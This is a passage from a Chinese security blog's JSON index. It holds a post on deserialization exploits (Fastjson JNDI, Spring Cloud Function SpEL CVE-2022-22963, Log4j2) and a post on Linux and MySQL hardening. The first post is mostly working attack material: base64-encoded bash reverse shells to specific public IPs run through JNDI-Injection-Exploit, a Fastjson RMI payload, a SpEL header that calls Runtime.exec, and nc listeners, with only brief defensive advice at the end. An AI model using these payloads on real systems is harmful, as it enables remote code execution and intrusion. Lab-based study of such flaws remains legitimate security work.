）：\nJdbcRowSetImpl 的 setDataSourceName() 方法触发 JNDI 查询。\n结合远程恶意类加载（如 Exploit.class 中定义静态代码块执行命令）。\n\n\n\n示例：\n在公网服务器上JNDI注入：\n12345java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTYyLjM5Lzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;121.40.162.39&quot;#相关说明：YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTYyLjM5Lzc3NzcgMD4mMQ==    --base64解码--&gt;bash -i &gt;&amp; /dev/tcp/121.40.162.39/7777 0&gt;&amp;1  #攻击者IP和监听端口，前后一致\n\n将会生成rmi：\n\n刷新页面抓包，修改请求方式为POST，设置fastjson payload：\n1234567&#123;    &quot;b&quot;:&#123;    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,    &quot;dataSourceName&quot;:&quot;rmi://8.220.194.45:1099/7b2rz4&quot;,    &quot;autoCommit&quot;:true    &#125;&#125;\n\n再开一个终端，执行监听nc -nvlp 7777；并将修改之后的bp包发送，成功将触发shell反弹：\n\n\n3.springboot反序列化（绿叶）1.原理：当Spring Cloud Function 使用functionRouter路径时，HTTP请求头参数存在 SPEL表达式注入漏洞，攻击者可通过该漏洞进行远程命令执行。\n请求头修改、增加内容：\n12POST /functionRouter HTTP/1.1 #修改内容spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNC42OS43MS8yMjIyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)  #需要添加的内容\n\n2.漏洞利用靶场：春秋云镜 CVE-2022-22963\n在kali里用sbscan扫描,发现springboot漏洞：\n# python.exe sbscan.py -u  [ip]\n\n抓包修改：\n\n开启监听，然后发送请求，收到shell反弹：\n\n4.log4j与log4j2的关系log4j 是 Apache 的一个开源日志库，是一个基于 Java 的日志记录框架  \nLog4j2 是 log4j 的后继者，其中引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI 组件等，被应用于业务系统开发，用于记录程序输入输出日志信息  \n5.log4j2反序列化1.原理：log4j2 在日志输出中，未对字符合法性进行严格的限制，攻击者通过构造**$&#123;jndi:ldap:恶意url/poc&#125;恶意日志，在log4j2通过 JNDI 的lookup()**函数解析日志时，就会执行poc.class文件里的代码，实现 JNDI注入，从而造成RCE。\n\n2.漏洞利用 Log4j2 默认支持 $&#123;jndi:ldap://attacker.com/exp&#125; 这种语法，攻击者可以通过恶意日志消息触发 远程代码执行（RCE） \n使用jndi利用工具执行反弹shell (经过base64) 必须是公网的服务器\n12345bash -i &gt;&amp; /dev/tcp/8.220.194.45/7777 0&gt;&amp;18.220.194.45 → 攻击者ip7777 任意端口（后续要监听）java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNC42OS43MS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;8.134.69.71&quot;  \n\n说明：\n12345678910111213141516171819202122命令解析：bash -i &gt;&amp; /dev/tcp/8.220.194.45/7777 0&gt;&amp;1该命令用于创建一个反向Shell连接，将本地Shell会话重定向到远程主机的指定端口。以下是每个字段的详细解释：1. bash -i    bash：调用Bash Shell。    -i：以交互模式（Interactive Mode）启动Shell，允许用户输入命令并接收输出。2. &gt;&amp; /dev/tcp/8.220.194.45/7777    &gt;&amp;：将标准输出（stdout）和标准错误（stderr）重定向到指定目标。    /dev/tcp/8.220.194.45/7777：        /dev/tcp：Bash内置的虚拟设备，支持通过TCP协议进行网络通信。        8.220.194.45：远程主机的IP地址。        7777：远程主机监听的端口号。        作用：将Shell的输出和错误信息发送到远程主机的7777端口。3. 0&gt;&amp;1    0：标准输入（stdin）的文件描述符。    &gt;&amp;1：将标准输入重定向到标准输出（即远程连接）。    作用：将远程主机发送的数据作为本地Shell的输入，实现双向通信。\n\n再用ssh连接服务器，监听一下端口 我这里是7777\nnc -lvnp 7777\n&lt;五&gt;反序列化防护\n应该尽量避免用户输入反序列化的参数\n如果确实需要对不受信任的数据源进行反序列化，需要确保数据未被篡改，比如使用数字签名来检查数据的完整性\n严格控制反序列化相关函数的参数，坚持用户所输入的信息都是不可靠的原则\n做好代码审计相关工作，提高开发人员的安全意识\n\n","slug":"反序列化漏洞","date":"2025-07-18T08:00:00.000Z","categories_index":"漏洞","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"52578dceeb148ed4d1a3fb12873d5ab1","title":"网安基础知识","content":"网安常用知识一、Linux安全基础 Linux 是最常用于服务器的操作系统之一，在网络安全中扮演着重要角色。它的安全性依赖于许多方面，包括文件权限、用户管理、网络配置等。 \n1.用户和权限管理\n最小权限原则：每个用户只应拥有完成任务所必需的最小权限。通过设置适当的文件权限和用户角色来控制用户对系统资源的访问。\n使用 sudo 管理权限：避免直接使用 root 用户。使用 sudo 命令可以为特定用户分配执行特定命令的权限。\n\n配置 /etc/sudoers 文件来管理权限：\n\n\n\n示例：\n12# 例如，允许用户 chunzi 执行所有命令chunzi    ALL=(ALL)       ALL\n\n设置强密码策略：\n\n在 /etc/login.defs 文件中，可以设置密码的长度、复杂度等要求。\n\n通过 passwd 命令可以强制用户定期更改密码。\n\n使用 pam_cracklib 模块来增强密码复杂性检查。\n\n\n通常，pam_cracklib 是作为 pam 模块的一部分预安装在大多数 Linux 发行版中的。如果你的系统没有安装，可以使用以下命令来安装它： \n\ntxtsudo apt-get install libpam-cracklib  (Debian/ubuntu系统)\nsudo yum install pam_cracklib  (Centos/RHEL系统)\n1234567-  `pam_cracklib` 的配置文件通常位于 `/etc/pam.d` 目录下。你需要编辑与密码相关的 PAM 配置文件，通常是 `/etc/pam.d/common-password`（Debian 系列）或 `/etc/pam.d/system-auth`（RHEL/CentOS 系列）。 - 找到类似于 `password requisite pam_unix.so` 或 `password requisite pam_cracklib.so` 的行，加入或修改如下内容： - ```  password requisite pam_cracklib.so retry=3 minlen=8 difok=3\n\n\n\n用户和组管理：\n\nuseradd、usermod、groupadd 等命令用于管理用户和组。\n使用 chmod、chown、chgrp 等命令管理文件权限。\n\n\n\n\n命令\n功能\n参数选项\n示例\n\n\n\nuseradd\n创建新用户\n-m, -d, -s, -G\nsudo useradd -m john\n\n\nusermod\n修改现有用户\n-d, -s, -G, -a\nsudo usermod -s &#x2F;bin&#x2F;bash john\n\n\ngroupadd\n创建新组\n-g, -r\nsudo groupadd dev\n\n\nchmod\n更改文件或目录权限\n-R\nchmod 755 file.txt\n\n\nchown\n更改文件或目录的所有者和所属组\n-R\nsudo chown john:dev file.txt\n\n\nchgrp\n更改文件或目录的所属组\n-R\nsudo chgrp dev file.txt\n\n\n2. 防火墙配置 (iptables &#x2F; firewalld)\n使用 iptables或 firewalld来配置防火墙规则，防止未授权的访问。 \n\niptables 配置示例：\n\nbashiptables -A INPUT -p tcp --dport 22 -j ACCEPT  # 允许 SSH 访问\niptables -A INPUT -p tcp --dport 80 -j ACCEPT  # 允许 HTTP 访问\niptables -A INPUT -j DROP  # 默认拒绝所有其他输入流量\n&lt;!--code￼2--&gt;\n\n\n使用密钥认证：禁用密码认证，只允许使用 SSH 密钥进行登录： \n\nbashPasswordAuthentication no\n&lt;!--code￼3--&gt;\n\n二、MySQL 安全基础MySQL 是流行的关系型数据库管理系统。保护 MySQL 数据库的安全非常重要，因为它存储了应用程序的关键数据。\n1. 数据库用户和权限管理最小权限原则：为每个数据库用户设置最小的访问权限，避免用户拥有过多的权限。\n\n使用 GRANT 命令为用户分配权限：\n\n  1GRANT SELECT, INSERT ON database_name.* TO &#x27;user&#x27;@&#x27;host&#x27;;\n\n\n通过 REVOKE 命令撤销权限：\n\n  1REVOKE ALL PRIVILEGES ON database_name.* FROM &#x27;user&#x27;@&#x27;host&#x27;;\n\n\n定期审计用户权限，确保不再需要的用户被删除。\n\n2. 配置 MySQL 密码策略\n使用 validate_password 插件强制实施密码复杂性要求。你可以通过以下命令启用：\n1INSTALL PLUGIN validate_password SONAME &#x27;validate_password.so&#x27;;\n\n配置密码长度、复杂度和过期时间等要求\n\n\n  12SET GLOBAL validate_password.policy=2;  # 设置密码策略SET GLOBAL validate_password.length=12;  # 设置密码最小长度\n\n3. 加密和数据保护\n启用 SSL 加密为了确保客户端与服务器之间的通信安全，可以启用 SSL 加密。 \n\n生成证书并配置 MySQL 使用 SSL：\n\n1ALTER USER &#x27;user&#x27;@&#x27;host&#x27; REQUIRE SSL;\n\n4. 配置 my.cnf 安全选项\n修改 my.cnf 配置文件，禁用远程 root 登录：\n123[mysqld]skip-networkingbind-address = 127.0.0.1  # 只允许本地访问\n\n5. 定期备份\n配置定期的数据库备份策略，使用 mysqldump 或 xtrabackup 等工具进行备份。\n1mysqldump -u root -p database_name &gt; backup.sql\n\n三、Shell 脚本在网络安全中的应用Shell 脚本在网络安全中通常用于自动化任务，比如日志分析、安全检查、定期备份等。通过编写 Shell 脚本，可以减少人工操作，提升工作效率。\n1. 文件权限审计脚本\n定期检查敏感文件和目录的权限，确保没有错误的权限设置。\n12345678#!/bin/bashFILES_TO_CHECK=(&quot;/etc/passwd&quot; &quot;/etc/shadow&quot; &quot;/etc/ssh/sshd_config&quot;)for file in &quot;$&#123;FILES_TO_CHECK[@]&#125;&quot;; do    if [ -e &quot;$file&quot; ]; then        echo &quot;Checking permissions for $file&quot;        ls -l $file    fidone\n\n2. 定期检查端口开放状态\n使用 netstat 或 ss 命令检查开放端口，确保没有不必要的端口暴露。\n1234#!/bin/bashOPEN_PORTS=$(netstat -tuln | grep -E &#x27;^tcp|^udp&#x27;)echo &quot;Open Ports:&quot;echo &quot;$OPEN_PORTS&quot;\n\n3. 日志分析脚本\n定期分析 SSH 登录日志，检测暴力破解尝试。\n12345#!/bin/bashLOG_FILE=&quot;/var/log/auth.log&quot;FAILED_LOGINS=$(grep &quot;Failed password&quot; $LOG_FILE)echo &quot;Failed login attempts:&quot;echo &quot;$FAILED_LOGINS&quot;\n\n4. 自动化安全更新脚本\n定期更新系统和软件包，确保漏洞得到及时修复。\n12345#!/bin/bashapt update &amp;&amp; apt upgrade -y  # 对于 Debian/Ubuntu 系统sudo yum check-update      # CentOS 7 或更早版本sudo dnf check-update      # CentOS 8 或更高版本\n\n","slug":"网安常用知识","date":"2025-07-16T08:00:00.000Z","categories_index":"网安基础","tags_index":"Web安全","author_index":"归尘aliez"}]